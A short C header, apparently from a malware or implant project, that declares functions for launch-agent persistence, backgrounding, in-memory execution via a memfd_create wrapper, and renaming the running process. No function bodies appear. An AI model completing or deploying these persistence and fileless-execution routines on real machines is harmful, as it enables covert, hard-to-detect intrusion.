#include <stdio.h>
#include <curl/curl.h>
#include <stdlib.h>
#include "../../config.h"

#include "../../common/helpers/win/registry.h"

G_STR(win_bin_name);
extern char win_bin_path[];

#if defined(__unix__) || defined(__APPLE__)

#include <sys/utsname.h>

#endif

#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>

#if defined(__linux__)

#include <sys/prctl.h>
#include <syscall.h>

#endif

#include <string.h>

extern char **environ;
extern char *g_current_path;

#if defined(__linux__)

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

#endif

int persistent_launch_agent(char *none);

void into_background();

int run_memory(char *buf);

int set_process_name(char *name);

